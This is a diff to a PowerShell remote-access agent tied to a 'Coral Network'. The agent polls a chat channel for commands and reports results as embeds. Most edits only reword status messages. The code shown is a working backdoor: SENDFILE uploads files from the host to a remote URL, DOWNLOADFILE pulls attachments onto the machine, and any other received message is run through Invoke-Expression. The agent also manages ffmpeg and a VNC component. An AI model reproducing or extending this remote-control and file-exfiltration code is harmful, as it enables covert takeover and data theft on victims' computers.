@@ -473,7 +473,7 @@ function Clean_MessageContent {
 function sendFile {
     param([string]$sendfilePath)
     if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
-        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"
         return
     }
 
@@ -483,7 +483,7 @@ function sendFile {
     $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
     
     if ($fileSize -gt 10MB) {
-        sendMsg -Message ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
         return
     }
 
@@ -493,7 +493,7 @@ function sendFile {
     if (Test-Path $sendfilePath -PathType Leaf) {
         $response = $webClient.UploadFile($url, "POST", $sendfilePath)
     } else {
-        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"
     }
 }
 #DOWNLOADFILE
@@ -501,7 +501,7 @@ function downloadFile {
     param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
     
     if (-not $attachmentUrl -or -not $fileName) {
-        sendMsg -Message ":x: **Error:** Missing attachment URL or filename"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Missing attachment URL or filename"
         return
     }
     
@@ -522,15 +522,13 @@ function downloadFile {
         
         if (Test-Path $fullPath) {
             $fileSize = [math]::Round((Get-Item $fullPath).Length / 1KB, 2)
-            sendMsg -Message ":white_check_mark: **File downloaded successfully**`n:file_folder: **Path:** ``$fullPath``"
-            sendMsg -Message ":information_source: **Size:** ${fileSize} KB"
-            #remove $filepath here
+            sendEmbedWithImage -Title "File Download Complete" -Description "Path: `$fullPath`nSize: ${fileSize} KB"
             return
         } else {
-            sendMsg -Message ":x: **Download failed:** File was not created"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Download failed:** File was not created"
         }
     } catch {
-        sendMsg -Message ":x: **Download error:** $($_.Exception.Message)"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Download error:** $($_.Exception.Message)"
     }
 }
 # =============================== quick info ===================
@@ -1531,7 +1529,7 @@ function Get_FunctionHelp {
     $commandInfo = Find_CommandInRegistry -Command $FunctionName
     
     if (-not $commandInfo.Found) {
-        sendMsg -Message ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**"
         return
     }
     
@@ -1552,7 +1550,7 @@ function Get_FunctionHelp {
         
         sendEmbedWithImage -Title "Function Help: $($script.alias.ToUpper())" -Description $msg
     } else {
-        sendMsg -Message ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
+        sendEmbedWithImage -Title "Local Function" -Description ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
     }
 }
 # =============================== HELP MENU ( R )===============================
@@ -1634,7 +1632,7 @@ while ($true) {
         Check_CompletedJobs
         $global:lastJobCheck = $currentTime
     }
-    if ($latestMessage -and $latestMessage -ne $previousMessage) {
+    if ($latestMessage) {
         $previousMessage = $latestMessage
         
         # Parse command and parameters
@@ -1643,7 +1641,7 @@ while ($true) {
         $parameters = $parsed.Parameters
         
         switch ($command) {
-            'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
+            'TEST' { sendEmbedWithImage -Title "TEST" -Description "Test successful from $env:COMPUTERNAME" }
             #Apply to individual commands
             'HELP' { 
                 if ($parameters.Count -gt 0 -and $parameters.ContainsKey("param0")) {
@@ -1661,7 +1659,7 @@ while ($true) {
             'JOBS' { List_AgentJobs }
             'STOPALLJOBS' { Stop_AllAgentJobs }
             'EXIT' { 
-                sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
+                sendEmbedWithImage -Title "DISCONNECTING..." -Description "**$env:COMPUTERNAME disconnecting from Coral Network**"
                 Stop_AllAgentJobs
                 RemoveFfmpeg
                 Execute_DynamicCommandWithParams -Command "DISABLENEKOUVNC"
@@ -1698,7 +1696,7 @@ while ($true) {
                     if (Test-Path $filePath) {
                         sendFile -sendfilePath $filePath
                     } else {
-                        sendMsg -Message ":x: **File not found:** ``$filePath``"
+                        sendEmbedWithImage -Title "File Not Found" -Description ":x: **File not found:** ``$filePath``"
                     }
                 }
                 elseif ($command -eq "DOWNLOADFILE") {
@@ -1707,19 +1705,19 @@ while ($true) {
                                    else { $env:TEMP }
                     
                     if ($global:lastMessageAttachments -and $global:lastMessageAttachments.Count -gt 0) {
-                        sendMsg -Message ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"
-                        
+                        sendEmbedWithImage -Title "Download Started" -Description ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"
+
                         foreach ($attachment in $global:lastMessageAttachments) {
                             $fileName = $attachment.filename
                             $fileUrl = $attachment.url
                             $fileSize = [math]::Round($attachment.size / 1KB, 2)
-                            
-                            sendMsg -Message ":arrow_down: **Downloading:** ``$fileName`` (${fileSize} KB)"
+
+                            sendEmbedWithImage -Title "Downloading" -Description ":arrow_down: **Downloading:** ``$fileName`` (${fileSize} KB)"
                             downloadFile -attachmentUrl $fileUrl -fileName $fileName -downloadPath $downloadPath
                         }
                     } else {
-                        sendMsg -Message ":x: **No file attachments found in the message**"
-                        sendMsg -Message ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **No file attachments found in the message**"
+                        sendEmbedWithImage -Title "Usage" -Description ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                     }
                 }
                 else {
@@ -1732,16 +1730,16 @@ while ($true) {
                             $result = Invoke-Expression $latestMessage 2>&1
                             if ($result) {
                                 $output = $result | Out-String
-                                sendMsg -Message "``````$output``````"
+                                sendEmbedWithImage -Title "Command Output" -Description ":white_check_mark: **Command executed successfully:** ``$latestMessage```n**Output:** ```n$output```""
                             } else {
-                                sendMsg -Message "**Command executed successfully (no output)**"
+                                sendEmbedWithImage -Title "Command Executed" -Description ":white_check_mark: **Command executed successfully:** ``$latestMessage``"
                             }
                         } catch {
                             $errorMsg = $_.Exception.Message
                             if ($errorMsg.Length -gt 1000) {
                                 $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                             }
-                            sendMsg -Message ":x: ``Error: $errorMsg`` :x:"
+                            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing command:** ``$latestMessage```n**Error:** $errorMsg"
                         }
                     }
                 }
